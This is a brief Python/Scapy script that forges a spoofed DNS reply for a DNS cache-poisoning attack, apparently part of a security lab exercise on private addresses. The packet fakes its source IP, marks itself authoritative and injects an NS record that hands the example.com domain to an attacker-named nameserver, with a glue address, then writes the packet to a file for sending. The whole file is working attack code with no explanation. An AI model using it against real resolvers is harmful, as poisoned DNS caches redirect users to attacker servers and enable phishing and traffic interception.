#!/usr/bin/python3

from scapy.all import *

# Construct the DNS header any payload
name = "twysw.example.com"
domain = "example.com"
ns = "ns.cohen50.com"

Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type="A", rdata="1.1.2.2", ttl=259200)
NSsec  = DNSRR(rrname=domain, type="NS", rdata=ns, ttl=259200)
ARsec = DNSRR(rrname=ns, type="A", rdata="10.0.2.8", ttl=259200)

dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,
			qdcount=1, ancount=1, nscount=1, arcount=1,
			qd=Qdsec, an=Anssec, ns=NSsec, ar=ARsec)

# Construct the IP , UDP headers, and the entire packet
ip = IP(dst="10.0.2.7", src="111.11.111.11", chksum=0)
udp = UDP(dport=33333, sport=53, chksum=0)
reply = ip/udp/dns

# Save the packet to a file
with open("ip_resp.bin", "wb") as f:
	f.write(bytes(reply))